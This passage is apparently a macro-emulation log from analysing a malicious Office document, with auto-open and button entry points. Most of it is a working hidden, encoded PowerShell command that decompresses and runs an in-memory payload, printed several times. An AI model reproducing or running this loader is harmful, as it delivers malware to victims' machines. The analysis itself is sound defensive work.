DcAOABEAFQAVwA4AE4ATwBHAGIANABLAG4AMAA1AFcAdQBsADEAOQArAHcAOQA0ADMATABYAFEAbQBGAFkAcABhAFkAUgBuAEgATwB0AFMAaQBrAFkAVwBWAGkAdgBVAHEAdwBUAG0AcABjAGwATgBpAEoAdQBQAGkAegArADQANgA0AFUAVwBjAFQAVQBVAEUAaQB1ADUAbAA3AEsAbgAwAEIANgAyAGIAcgByAE8AbgBCAGkASQBnADIAeQBDAHoAQQBzAEYAQQA5AHIASgByAEkAeQBWAEsAcgBVAHcATgBRAHgAbAB5AHIAbQA3AHUAcABDADgAVgBOAE0AdQBzAGkAeQA0AE0AaQBCAHAAUgBoAHkAQQBqAE0AWgBGAGcAcgBKAE8AQgBQAG8AMQBYAC8AbgBSADcAbQBtAFkAQwBMAGEAbgBvAFYAdABrAE0ANgByAGsARwBDAGgASABkAFMAYwB5ADQAbgBLADYAWQBaADIAVwBDAC8AKwBCADcAZQB2ADUAKwBSADgASwBEAEsAcwByAGkAQgA5AGMAQgBvAEkAbwBGAGcAdQBxAFYASQByAE0AeQBCAFEAMQA0AHIAVgBuADQAagAzAHYANwBuADMAWQA0AG4ANQB3AGMAMQB1AGcAQwArAEoATABPAFUASAA4AFoAbABMAFMAWABaAGMAYwBrAGsAdAB1ADEAeQArAHYAbQBPAFoASQB4AGMAUQBRAEUAMABJAFgASgB0AEQASQBXADQAMwBsAGIAeQBNAGwAWQByAE0AWQArAFMATABxAFgAUwBZAHQAWQBNACsASAB3AHMARABmADgAQQB2ADQASQBuAGgAWQBYAHkAQgBIADQAKwBIAGMANAArAGIAagB6AFUAKwBtAGsAdwBIADkATgBBAFEAWgA0ACsAOQBaAHAAUgBFAFkAcgBUAGcAYQBFAGEAZwBRAGUANwBOADcALwBPAEcARwBFAC8AYwBwADMAcABrAE4AKwB1ADYASgA4AFkAeQB6AEkAVQBQAC8AaQBEAHMAaQBYAEcAUABIAFQAUgA4AFYAMgBqAHYAegBNADcARgB6AGwAbAAvAHAAaQBaADEAZABTAE0ASwBEADIAcABmAGEAQQA1AFcAbwBaAEQASgBEADgAUwBZAEUALwB4AHUAeAA0AFgAeAB2AFIAaAAzADMAUwBIAG8AUABiAFkAOQBoADAAdgAwAEoAdQBhAEgAYgBiAHcAWgBhAHcAbABEAEgAagBIAGEAbgBkAEwAUgBxAHEATABRADkAZgA0AHEAbABjAGMAcgAzAHAATQBWAFIAeAArAHIAOQBaAGsAdwBsAE4AOABhAFAARABuAFIAKwBtAEIATwA2ADMAeQA0ADEAVgBjACsAegAwAHoAVgBrAFEAZAB4AGkAcwB4AE8AYQBUAHYARABWAEYARwA0AFYARAB0AEcAYgA5AE8AdQBkAE4AQQBHADgAbABnAGYAKwBZADgAdAAvAGEAMgBSAEMAbgBJAFQAYwBEAGcAcABxAGIAUwBmAHQAZgBXAFQAdABoAEUAUwBiAFMATwBQADAAOABHAFQAMwBBAGUANwBmAHIAVABlAE4AUQBlAFMAdwBvAEIAdABSAFQAOABsACsAagBLAGMARABCAGYAawBpAFoAawBpAHUANQBtAG0AVAByAE0AcgBIAHMAVABUAFcAUABQAEkAYQBqAE4AcwBCAHkAagB0AGUAbQBNAFQAcQA1AHgAQgBNAHQAMwBoAGUATABzAGIAZABuAGgAeQA5AGsAOQBSADUAcQBrAE8AdABxADMAQgBvAGoAYwBDADIAMAA1AFgAawBpAEEAWABxAEMAWABnAEoAYwBpAE0AUQBoAE4AcwBQAFEAYQArAGEARQBxAEgAdABIADMAUQBHAEQAbQBSAE4ATgA2AEsATgBHAFYAYQBDAFcAYwBwAE0AOQB1ADIATgBiAFIATgBlADEATwBXAFYAVQBlAGoAdwBUAEYAeABIAHcAUABQADkAOQB2AEgANwB0AE0AbQBsAFQAdgBpAGwASwA3AGcAVgBiAGgAdAB6AHAATgBPAEoAMwA2AG8AdAA3AG0ATgA5ADkAaABOAFYAOABhAHEAVwBUACsARQBnAHUAYgBlADcANwBYADcASgB1AEgAYQA0AFoANwBUACsAdQB6AFMAUABNADQAYQBpAC8AMABZADcAUgA0ADIAOQBwAHYASQBiAEcAZAB6AGkANQA4ADgASABlAGYAOQB4AFUAcgBiAHMAbwAyAFcAdABGADUANgAwAHcAVQB0AFMAawBKAEMATAA5AGkARQBzAEEAdQArAHQAWgBoAFoAKwBtAGkAMgA3AFAAVAA3AHIAQgB4AHAAZgBjADkAbQBUADYASABNAG4AMwBZADkASABmAEkAeABwADAALwBMAEoAUwBzAFQAUABaAEgAVwB2AGIAbgA0AHgARABMADYAWABEAG4AcQBtAGIAMwBjAFIAcAArAFYAWgBIAFcAOQBaAGQAZwBHAEYAMgBzAHoAYQBkADYAYgBTADcASwB3AGwANQBiADgAZgBEAFkAYQBtADgAZgBEAGsAOQBIAG4ARgBpAHUARgBuAC8ASAAzADkAbgAxAEwATgAxAHIAMwBoAHQAYwA5AEMASABIAHoAbgByAFYAWgBKADAAWgAxAHMANQBKADAAVgBOAHUAKwBmADIAagB2AHUAQwBXAHoAVwB3AFoAcgBtAGYAZQBUAEoAUgBUAEgAZABHAEcAZABqAEEAZQByADAAeAByAEYASgBwAHIAdQAyAC8AUABPAFEAZQBWAFgAWAB0AHcAUQBKAEgAbwBtAGUAWQByADkARwBEAC8ATQBrAFMASAB2AE8ARwA0AHQAVABmAGMASABvADgARgAxAFQAMgA5AG0AMwAyADUAQgBlAGIAbABuAHAAUQBSAFgAVQB0ACsAUgB1AGcATQBoAFUAdgB2AHQAbABoAEoASQBSAG8AZgBWAGUAZwA4AFQAZABEAEEAYgBpAHEAMAB2ADcAZgBVAG0AawBPAGwAVwB4AGQAZwBOAGoAcgBQAEoAawBDAEYAdgBLAGEATAA1AEoAYgA5ADEAagBVAHAAbwA4AFAANQBoADMARwBwAHQAagBIAHUATQBoAHMASgBoAHcAOQBVADMAawA5AFcARQA3AGYAZwB6AHQAeAAzAHYAcABXAEIAeQBhAEEANgBPAFgATABTAFAASgBrAG4ARgAwAFcASQBqAFgAcwA5AHAAUQAwAEwAcQAwADIAQwA2AE4AdwBiAE4AKwBrAFIAdwBMAFYATwBLAGgARwBhAEYANAA3AFoAYQBYAFcARwBTAFIARwA3AEsAdQAyADEAWABIAHQATQB0AHgATwBuAEEAVQAyAFUAdABqADgAVQAzADQARABNAGQASABzAFMARwBkAE4AQgA1ADgAcgBCAG4AZQBuADMAZwBZAFcASQBEAFgANABCAEgAWgBzAFUAWgBKAG4ANABJAFAARQAyAGwAbgBwAGoASwBHAFYAZABQAEIAQQBWAGMAegB0AFcANgBZAGYAbgBkAG0AZABrAGMAcQBRAGYAZwB5AEUATgBUAGkAawBZAFEAaABNAGIAdgBaAHkAdgBJADEAWQBKAG4ANgBiAFUAdwBvADkAWAArAHgAVgBaAFcAagBRAHcAMwBnAFAANwBpAGwATgAzAFoALwA2AEwAZwAvADgANABpADEASAB1ADkAZwBTAG8ARABCAFMAeQBiAHIAMQBUAEsAMgBiADMALwB2AHYASgA4AGUAMwBxADUAOQBtAG4AdgA3ADMAZgBxAEMAYQB3AHgAcgBhAHgAMgA1AFMAcwB4ACsAbABDAHgAZgB0AFgAOABTAEMAZwBJADkAOABpAEMAUwBnAFkATgB6AFAAWAA2AEUAZAB4AEEAdQBMAFEAaABVADkAZgBNAE4ARQBxAGwAegB6AHYAbgBJAHcANABjAGIARQBGAFgAQwBYADMAbgB0AFcAaQB6AGwAdQBWAHEAVwBlAFAAMABpAHcANABHADIAcgBoAHoAYwAvAFUAQwBsADkATQBTAGgAawB6AGoAMAAxAEcAWgBlAGgAZQBFAGIAdQBrAGMAawB4AG8AWgBSAHQANQBjAFgAQwBLADgAOQBsAGgAWAB3AFMAOQBmAHQAaABCAGUAOQBRAE8ASQBZACsAegBzAHkATAA1AEsAMABTAGUARwBwAHUAbgBzAHYAMABtAFgAQwA3ADgAUABTADkAZgAxADAAdABLADcAdQBXAHIAVwBYAEgAMwB3ADUATwBOAE8AVgByADUAVAArAFkASgArAEUARABrADIALwBqADgAbQA0AEkAZABOAC8AegB1ADAARwBYAGgANQBmAC8AWQBPAFgAZQA3AFEANQAzAGkAVgBDADgAVQAvAEMAZwBYAFIAbwBEADcATQBoACsAWQBiAGYASAAxAGcAbgAzAHIATQB1AFIAYwBDAHoAYwBuAGQAdwBWAFgAaABVAHkAVwAvAGUAMAB1ADMAcQBFAHkASgAvAEkAYQA2AFIAZABSADMANgBnADcAQwBZADAATwBtAEEAZAA4AHIAdwBTADcASwBMAG0ATABxAC8AUABuADEAagBVAHEAUQBlAFYAYgA4AFIAcwAyAHgAaABxAEYAOQB2AGgAdQA2AEsAcgBBAFUAUQB6ACsAVgBtAGMANgBOAFoATQBJAHcAOQB6AGUAVQBZADgARgBrAHoAdwAwAEEAQQBBAD0APQAiACkAKQA7AEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AUwB0AHIAZQBhAG0AUgBlAGEAZABlAHIAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACQAcwAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA7A')
INFO     ACTION: Execute Command - params 'powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBLADEAWABiAFgATwBpAHkAaABMACsASABIADgARgBIADEASwBsAGwAcwBhAGcAcQBJAGwANwBhADYAcwBPAEsAQwBnAHEAKwBJAEoAdgBNAFMAZQBWAEcAbQBCAFEAbABIAGMARwBrAEoAegBkAC8AMwA0AGEAMQBKAHoAcwAzAGUAeQA5AFcAMwBXAHYAVgBaAFQARABUAEgAZABQADkAOQBQAFAAOQBEAFEASwBKAG4AYwBLAEMAVQB5AE4AUwBLADYATwBxAGIAcwBWAEQAawBMAFQAZABhAGgARwBvAFgARABiAGMAMABWAEMAZgBhAFgAKwBLAEIAYQBNAHkATgBGAEkATgBwADAATgBYAG4AZQBZAHYASABxAEIAcQA3ADAAaQBYAFEAOQB3AEcARgBKAC8ARgBXADYAbQBLAEUAQQAyAFYAYgBxAE4AVQBmAEIAcQB1ADMAcABrADQAUwBxAFYAdgAyAFMAQwBXAEkAOABDAFgATAA2ADUASwBkAHoAawBVADUARQBUAEkAZwBPAC8ATwBvAGkAWQBNAFgANgAxAE0AZABtADcAZQBnAGcAYgBsAFoANQBaAHoAKwB1ADUATgBqAEsAZABsAHkAOQBmAHUAbABFAFEAWQBJAGUAYwAzADIAdAA5AFQATgBnAHcAeABMAFoAcQBtAFQAZwBzAGwAYQBsAHYAMQBIAHEAUABBADMAdwAzAFUAUQA5AFkASQA5AFIAZgAxAE8AMQByAHIAVwArADUASwByAEkAdQBZAG0AawBYAGEAWABzAEkAaQBIAFgAMABiAEcAMwBzAGEAaQBpAEwAbwBLAFoANABsAGsAbABLAHgAVAAvAC8ATABKAGEAZgA3ACsAbwB2AE4AZAA2AFAAawBCAFcAVwBpAGsAbwBhAEUAbQB6AFgAZABNAHMAcQBsAHEAbgB2ADUAVwB6AEQAUgBlAHIAaABVAGwARQB5AHQAYwBBAE4AWABZAFAAVQAxAHEAYgBEAE4ARwByAEwAMwBIAHMANQBkADEANAA2ACsAMQA0AHMAWAB5AEwAYgBlAFEAagBpACsASABXAFEAbQBkAFcAegBUAHEAawBJAHcAeQBsAGcAdwA1ADQAeABMAEYAYQBwADUAMgB5AC8ANQA1AGMAWAA2AG8AOQAzAGIAKwBhAFIAUQAwAHcAYgAxADAAUwBIADQATQBEADEARgBCAHoARQBwAG8AYgBEADIAZwBBADUAdQBvAFgAbgAyAEEAQwAxAFkAZwBqAHAAYwAzAGIARgBNAGoAZwBSAFkAQgBJAEYARABuAFgAMQBCAGYAUgBpADkANABoAEwAdAAwADUAawBXAFYAVwB3ACsALwB5ADcAZABsADkASwBNAGsANgB1ADQAUAA2AHUAVQB1AG0AagBFAGsAaABOAFMAVgBDAHUAWABqAGoAeABPADMAQgBJAE8AVwAvAE8ANQBpAEMAYwBuADcAegAvAFEASwA0AHkALwBIADQAaQBXAEwAbgB3AHYAZgBBAEoAVgBYAFYAcwA0AFIAMABpACsASgBVAEEAdgBoACsANABXAHIAaQA1AGUAYwA2AEgARwBPAEkAcABUAGQAMwBRAHoAUABXACsAVQBuAFMAVgBrAHMAQQBKAFIATgB3AGcAegBkAEsANQBDAEMASgBjAGYAdgBrAG4AUAArAGQAdAByADUAcABoADkAWgBlAEcANgBsAGUAdABpADgANAA1AFAAVwBjAC8AdgBsAEwAUABLADkAZgBVAFgAdwBvADMANQBjAEsARgBQAGQAbgA4AHEAeABxAFoAbABvADYARABiAFAAMwBYAHAANgBHAEgARABkAFAAQgB2AGQAUgBCAHQAcQBsAGQAQwBWAC8ANgBMAEcAZgBZAHMASABDAE8AUgArADAAcQBKAG8ATwBmAHAAZQBKAGwAQQBlAHUAOQBDAHoAcgBGAEQATgBEAG4AbgA5AFYANAAyAHkAVAB2AHUAdAB6AFoATwBWAGEARAB2AEkAZgBnAEYAVgBDAGkALwBLAE0AegA1AHgAeQBXAGkAcQBJAGoAWQBSAHYAdwBPADcAOABEAFQAVwA4AE4ATwBHAGIANABLAG4AMAA1AFcAdQBsADEAOQArAHcAOQA0ADMATABYAFEAbQBGAFkAcABhAFkAUgBuAEgATwB0AFMAaQBrAFkAVwBWAGkAdgBVAHEAdwBUAG0AcABjAGwATgBpAEoAdQBQAGkAegArADQANgA0AFUAVwBjAFQAVQBVAEUAaQB1ADUAbAA3AEsAbgAwAEIANgAyAGIAcgByAE8AbgBCAGkASQBnADIAeQBDAHoAQQBzAEYAQQA5AHIASgByAEkAeQBWAEsAcgBVAHcATgBRAHgAbAB5AHIAbQA3AHUAcABDADgAVgBOAE0AdQBzAGkAeQA0AE0AaQBCAHAAUgBoAHkAQQBqAE0AWgBGAGcAcgBKAE8AQgBQAG8AMQBYAC8AbgBSADcAbQBtAFkAQwBMAGEAbgBvAFYAdABrAE0ANgByAGsARwBDAGgASABkAFMAYwB5ADQAbgBLADYAWQBaADIAVwBDAC8AKwBCADcAZQB2ADUAKwBSADgASwBEAEsAcwByAGkAQgA5AGMAQgBvAEkAbwBGAGcAdQBxAFYASQByAE0AeQBCAFEAMQA0AHIAVgBuADQAagAzAHYANwBuADMAWQA0AG4ANQB3AGMAMQB1AGcAQwArAEoATABPAFUASAA4AFoAbABMAFMAWABaAGMAYwBrAGsAdAB1ADEAeQArAHYAbQBPAFoASQB4AGMAUQBRAEUAMABJAFgASgB0AEQASQBXADQAMwBsAGIAeQBNAGwAWQByAE0AWQArAFMATABxAFgAUwBZAHQAWQBNACsASAB3AHMARABmADgAQQB2ADQASQBuAGgAWQBYAHkAQgBIADQAKwBIAGMANAArAGIAagB6AFUAKwBtAGsAdwBIADkATgBBAFEAWgA0ACsAOQBaAHAAUgBFAFkAcgBUAGcAYQBFAGEAZwBRAGUANwBOADcALwBPAEcARwBFAC8AYwBwADMAcABrAE4AKwB1ADYASgA4AFkAeQB6AEkAVQBQAC8AaQBEAHMAaQBYAEcAUABIAFQAUgA4AFYAMgBqAHYAegBNADcARgB6AGwAbAAvAHAAaQBaADEAZABTAE0ASwBEADIAcABmAGEAQQA1AFcAbwBaAEQASgBEADgAUwBZAEUALwB4AHUAeAA0AFgAeAB2AFIAaAAzADMAUwBIAG8AUABiAFkAOQBoADAAdgAwAEoAdQBhAEgAYgBiAHcAWgBhAHcAbABEAEgAagBIAGEAbgBkAEwAUgBxAHEATABRADkAZgA0AHEAbABjAGMAcgAzAHAATQBWAFIAeAArAHIAOQBaAGsAdwBsAE4AOABhAFAARABuAFIAKwBtAEIATwA2ADMAeQA0ADEAVgBjACsAegAwAHoAVgBrAFEAZAB4AGkAcwB4AE8AYQBUAHYARABWAEYARwA0AFYARAB0AEcAYgA5AE8AdQBkAE4AQQBHADgAbABnAGYAKwBZADgAdAAvAGEAMgBSAEMAbgBJAFQAYwBEAGcAcABxAGIAUwBmAHQAZgBXAFQAdABoAEUAUwBiAFMATwBQADAAOABHAFQAMwBBAGUANwBmAHIAVABlAE4AUQBlAFMAdwBvAEIAdABSAFQAOABsACsAagBLAGMARABCAGYAawBpAFoAawBpAHUANQBtAG0AVAByAE0AcgBIAHMAVABUAFcAUABQAEkAYQBqAE4AcwBCAHkAagB0AGUAbQBNAFQAcQA1AHgAQgBNAHQAMwBoAGUATABzAGIAZABuAGgAeQA5AGsAOQBSADUAcQBrAE8AdABxADMAQgBvAGoAYwBDADIAMAA1AFgAawBpAEEAWABxAEMAWABnAEoAYwBpAE0AUQBoAE4AcwBQAFEAYQArAGEARQBxAEgAdABIADMAUQBHAEQAbQBSAE4ATgA2AEsATgBHAFYAYQBDAFcAYwBwAE0AOQB1ADIATgBiAFIATgBlADEATwBXAFYAVQBlAGoAdwBUAEYAeABIAHcAUABQADkAOQB2AEgANwB0AE0AbQBsAFQAdgBpAGwASwA3AGcAVgBiAGgAdAB6AHAATgBPAEoAMwA2AG8AdAA3AG0ATgA5ADkAaABOAFYAOABhAHEAVwBUACsARQBnAHUAYgBlADcANwBYADcASgB1AEgAYQA0AFoANwBUACsAdQB6AFMAUABNADQAYQBpAC8AMABZADcAUgA0ADIAOQBwAHYASQBiAEcAZAB6AGkANQA4ADgASABlAGYAOQB4AFUAcgBiAHMAbwAyAFcAdABGADUANgAwAHcAVQB0AFMAawBKAEMATAA5AGkARQBzAEEAdQArAHQAWgBoAFoAKwBtAGkAMgA3AFAAVAA3AHIAQgB4AHAAZgBjADkAbQBUADYASABNAG4AMwBZADkASABmAEkAeABwADAALwBMAEoAUwBzAFQAUABaAEgAVwB2AGIAbgA0AHgARABMADYAWABEAG4AcQBtAGIAMwBjAFIAcAArAFYAWgBIAFcAOQBaAGQAZwBHAEYAMgBzAHoAYQBkADYAYgBTADcASwB3AGwANQBiADgAZgBEAFkAYQBtADgAZgBEAGsAOQBIAG4ARgBpAHUARgBuAC8ASAAzADkAbgAxAEwATgAxAHIAMwBoAHQAYwA5AEMASABIAHoAbgByAFYAWgBKADAAWgAxAHMANQBKADAAVgBOAHUAKwBmADIAagB2AHUAQwBXAHoAVwB3AFoAcgBtAGYAZQBUAEoAUgBUAEgAZABHAEcAZABqAEEAZQByADAAeAByAEYASgBwAHIAdQAyAC8AUABPAFEAZQBWAFgAWAB0AHcAUQBKAEgAbwBtAGUAWQByADkARwBEAC8ATQBrAFMASAB2AE8ARwA0AHQAVABmAGMASABvADgARgAxAFQAMgA5AG0AMwAyADUAQgBlAGIAbABuAHAAUQBSAFgAVQB0ACsAUgB1AGcATQBoAFUAdgB2AHQAbABoAEoASQBSAG8AZgBWAGUAZwA4AFQAZABEAEEAYgBpAHEAMAB2ADcAZgBVAG0AawBPAGwAVwB4AGQAZwBOAGoAcgBQAEoAawBDAEYAdgBLAGEATAA1AEoAYgA5ADEAagBVAHAAbwA4AFAANQBoADMARwBwAHQAagBIAHUATQBoAHMASgBoAHcAOQBVADMAawA5AFcARQA3AGYAZwB6AHQAeAAzAHYAcABXAEIAeQBhAEEANgBPAFgATABTAFAASgBrAG4ARgAwAFcASQBqAFgAcwA5AHAAUQAwAEwAcQAwADIAQwA2AE4AdwBiAE4AKwBrAFIAdwBMAFYATwBLAGgARwBhAEYANAA3AFoAYQBYAFcARwBTAFIARwA3AEsAdQAyADEAWABIAHQATQB0AHgATwBuAEEAVQAyAFUAdABqADgAVQAzADQARABNAGQASABzAFMARwBkAE4AQgA1ADgAcgBCAG4AZQBuADMAZwBZAFcASQBEAFgANABCAEgAWgBzAFUAWgBKAG4ANABJAFAARQAyAGwAbgBwAGoASwBHAFYAZABQAEIAQQBWAGMAegB0AFcANgBZAGYAbgBkAG0AZABrAGMAcQBRAGYAZwB5AEUATgBUAGkAawBZAFEAaABNAGIAdgBaAHkAdgBJADEAWQBKAG4ANgBiAFUAdwBvADkAWAArAHgAVgBaAFcAagBRAHcAMwBnAFAANwBpAGwATgAzAFoALwA2AEwAZwAvADgANABpADEASAB1ADkAZwBTAG8ARABCAFMAeQBiAHIAMQBUAEsAMgBiADMALwB2AHYASgA4AGUAMwBxADUAOQBtAG4AdgA3ADMAZgBxAEMAYQB3AHgAcgBhAHgAMgA1AFMAcwB4ACsAbABDAHgAZgB0AFgAOABTAEMAZwBJADkAOABpAEMAUwBnAFkATgB6AFAAWAA2AEUAZAB4AEEAdQBMAFEAaABVADkAZgBNAE4ARQBxAGwAegB6AHYAbgBJAHcANABjAGIARQBGAFgAQwBYADMAbgB0AFcAaQB6AGwAdQBWAHEAVwBlAFAAMABpAHcANABHADIAcgBoAHoAYwAvAFUAQwBsADkATQBTAGgAawB6AGoAMAAxAEcAWgBlAGgAZQBFAGIAdQBrAGMAawB4AG8AWgBSAHQANQBjAFgAQwBLADgAOQBsAGgAWAB3AFMAOQBmAHQAaABCAGUAOQBRAE8ASQBZACsAegBzAHkATAA1AEsAMABTAGUARwBwAHUAbgBzAHYAMABtAFgAQwA3ADgAUABTADkAZgAxADAAdABLADcAdQBXAHIAVwBYAEgAMwB3ADUATwBOAE8AVgByADUAVAArAFkASgArAEUARABrADIALwBqADgAbQA0AEkAZABOAC8AegB1ADAARwBYAGgANQBmAC8AWQBPAFgAZQA3AFEANQAzAGkAVgBDADgAVQAvAEMAZwBYAFIAbwBEADcATQBoACsAWQBiAGYASAAxAGcAbgAzAHIATQB1AFIAYwBDAHoAYwBuAGQAdwBWAFgAaABVAHkAVwAvAGUAMAB1ADMAcQBFAHkASgAvAEkAYQA2AFIAZABSADMANgBnADcAQwBZADAATwBtAEEAZAA4AHIAdwBTADcASwBMAG0ATABxAC8AUABuADEAagBVAHEAUQBlAFYAYgA4AFIAcwAyAHgAaABxAEYAOQB2AGgAdQA2AEsAcgBBAFUAUQB6ACsAVgBtAGMANgBOAFoATQBJAHcAOQB6AGUAVQBZADgARgBrAHoAdwAwAEEAQQBBAD0APQAiACkAKQA7AEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AUwB0AHIAZQBhAG0AUgBlAGEAZABlAHIAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACQAcwAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA7A' - Shell function
INFO     ACTION: Found Entry Point - params 'squidgame_click' - 
INFO     evaluating Sub SquidGame_Click
INFO     ACTION: Found Entry Point - params 'SquidGame_Click' - 
INFO     evaluating Sub SquidGame_Click
INFO     ACTION: Found Entry Point - params 'CatchMeIfYouCan_Click' - 
INFO     evaluating Sub CatchMeIfYouCan_Click
INFO     ACTION: Found Entry Point - params 'catchmeifyoucan_click' - 
INFO     evaluating Sub CatchMeIfYouCan_Click

Recorded Actions:
+-------------------+---------------------------+----------------+
| Action            | Parameters                | Description    |
+-------------------+---------------------------+----------------+
| Found Entry Point | autoopen                  |                |
| Execute Command   | powershell -nop -w hidden | Shell function |
|                   | -encodedcommand JABzAD0AT |                |
|                   | gBlAHcALQBPAGIAagBlAGMAdA |                |
|                   | AgAEkATwAuAE0AZQBtAG8AcgB |                |
|                   | 5AFMAdAByAGUAYQBtACgALABb |                |
|                   | AEMAbwBuAHYAZQByAHQAXQA6A |                |
|                   | DoARgByAG8AbQBCAGEAcwBlAD |                |
|                   | YANABTAHQAcgBpAG4AZwAoACI |                |
|                   | ASAA0AHMASQBBAEEAQQBBAEEA |                |
|                   | QQBBAEEAQQBLADEAWABiAFgAT |                |
|                   | wBpAHkAaABMACsASABIADgARg |                |
|                   | BIADEASwBsAGwAcwBhAGcAcQB |                |
|                   | JAGwANwBhADYAcwBPAEsAQwBn |                |
|                   | AHEAKwBJAEoAdgBNAFMAZQBWA |                |
|                   | EcAbQBCAFEAbABIAGMARwBrAE |                |
|                   | oAegBkAC8AMwA0AGEAMQBKAHo |                |
|                   | AcwAzAGUAeQA5AFcAMwBXAHYA |                |
|                   | VgBaAFQARABUAEgAZABQADkAO |                |
|                   | QBQAFAAOQBEAFEASwBKAG4AYw |                |
|                   | BLAEMAVQB5AE4AUwBLADYATwB |                |
|                   | xAGIAcwBWAEQAawBMAFQAZABh |                |
|                   | AGgARwBvAFgARABiAGMAMABWA |                |
|                   | EMAZgBhAFgAKwBLAEIAYQBNAH |                |
|                   | kATgBGAEkATgBwADAATgBYAG4 |                |
|                   | AZQBZAHYASABxAEIAcQA3ADAA |                |
|                   | aQBYAFEAOQB3AEcARgBKAC8AR |                |
|                   | gBXADYAbQBLAEUAQQAyAFYAYg |                |
|                   | BxAE4AVQBmAEIAcQB1ADMAcAB |                |
|                   | rADQAUwBxAFYAdgAyAFMAQwBX |                |
|                   | AEkAOABDAFgATAA2ADUASwBkA |                |
|                   | HoAawBVADUARQBUAEkAZwBPAC |                |
|                   | 8ATwBvAGkAWQBNAFgANgAxAE0 |                |
|                   | AZABtADcAZQBnAGcAYgBsAFoA |                |
|                   | NQBaAHoAKwB1ADUATgBqAEsAZ |                |
|                   | ABsAHkAOQBmAHUAbABFAFEAWQ |                |
|                   | BJAGUAYwAzADIAdAA5AFQATgB |                |
|                   | nAHcAeABMAFoAcQBtAFQAZwBz |                |
|                   | AGwAYQBsAHYAMQBIAHEAUABBA |                |
|                   | DMAdwAzAFUAUQA5AFkASQA5AF |                |
|                   | IAZgAxAE8AMQByAHIAVwArADU |                |
|                   | ASwByAEkAdQBZAG0AawBYAGEA |                |
|                   | WABzAEkAaQBIAFgAMABiAEcAM |                |
|                   | wBzAGEAaQBpAEwAbwBLAFoANA |                |
|                   | BsAGsAbABLAHgAVAAvAC8ATAB |                |
|                   | KAGEAZgA3ACsAbwB2AE4AZAA2 |                |
|                   | AFAAawBCAFcAVwBpAGsAbwBhA |                |
|                   | EUAbQB6AFgAZABNAHMAcQBsAH |                |
|                   | EAbgB2ADUAVwB6AEQAUgBlAHI |                |
|                   | AaABVAGwARQB5AHQAYwBBAE4A |                |
|                   | WABZAFAAVQAxAHEAYgBEAE4AR |                |
|                   | wByAEwAMwBIAHMANQBkADEANA |                |
|                   | A2ACsAMQA0AHMAWAB5AEwAYgB |                |
|                   | lAFEAagBpACsASABXAFEAbQBk |                |
|                   | AFcAegBUAHEAawBJAHcAeQBsA |                |
|                   | GcAdwA1ADQAeABMAEYAYQBwAD |                |
|                   | UAMgB5AC8ANQA1AGMAWAA2AG8 |                |
|                   | AOQAzAGIAKwBhAFIAUQAwAHcA |                |
|                   | YgAxADAAUwBIADQATQBEADEAR |                |
|                   | gBCAHoARQBwAG8AYgBEADIAZw |                |
|                   | BBADUAdQBvAFgAbgAyAEEAQwA |                |
|                   | xAFkAZwBqAHAAYwAzAGIARgBN |                |
|                   | AGoAZwBSAFkAQgBJAEYARABuA |                |
|                   | FgAMQBCAGYAUgBpADkANABoAE |                |
|                   | wAdAAwADUAawBXAFYAVwB3ACs |                |
|                   | ALwB5ADcAZABsADkASwBNAGsA |                |
|                   | NgB1ADQAUAA2AHUAVQB1AG0Aa |                |
|                   | gBFAGsAaABOAFMAVgBDAHUAWA |                |
|                   | BqAGoAeABPADMAQgBJAE8AVwA |                |
|                   | vAE8ANQBpAEMAYwBuADcAegAv |                |
|                   | AFEASwA0AHkALwBIADQAaQBXA |                |
|                   | EwAbgB3AHYAZgBBAEoAVgBYAF |                |
|                   | YAcwA0AFIAMABpACsASgBVAEE |                |
|                   | AdgBoACsANABXAHIAaQA1AGUA |                |
|                   | YwA2AEgARwBPAEkAcABUAGQAM |                |
|                   | wBRAHoAUABXACsAVQBuAFMAVg |                |
|                   | BrAHMAQQBKAFIATgB3AGcAegB |                |
|                   | kAEsANQBDAEMASgBjAGYAdgBr |                |
|                   | AG4AUAArAGQAdAByADUAcABoA |                |
|                   | DkAWgBlAEcANgBsAGUAdABpAD |                |
|                   | gANAA1AFAAVwBjAC8AdgBsAEw |                |
|                   | AUABLADkAZgBVAFgAdwBvADMA |                |
|                   | NQBjAEsARgBQAGQAbgA4AHEAe |                |
|                   | ABxAFoAbABvADYARABiAFAAMw |                |
|                   | BYAHAANgBHAEgARABkAFAAQgB |                |
|                   | 2AGQAUgBCAHQAcQBsAGQAQwBW |                |
|                   | AC8ANgBMAEcAZgBZAHMASABDA |                |
|                   | E8AUgArADAAcQBKAG8ATwBmAH |                |
|                   | AAZQBKAGwAQQBlAHUAOQBDAHo |                |
|                   | AcgBGAEQATgBEAG4AbgA5AFYA |                |
|                   | NAAyAHkAVAB2AHUAdAB6AFoAT |                |
|                   | wBWAGEARAB2AEkAZgBnAEYAVg |                |
|                   | BDAGkALwBLAE0AegA1AHgAeQB |                |
|                   | XAGkAcQBJAGoAWQBSAHYAdwBP |                |
|                   | ADcAOABEAFQAVwA4AE4ATwBHA |                |
|                   | GIANABLAG4AMAA1AFcAdQBsAD |                |
|                   | EAOQArAHcAOQA0ADMATABYAFE |                |
|                   | AbQBGAFkAcABhAFkAUgBuAEgA |                |
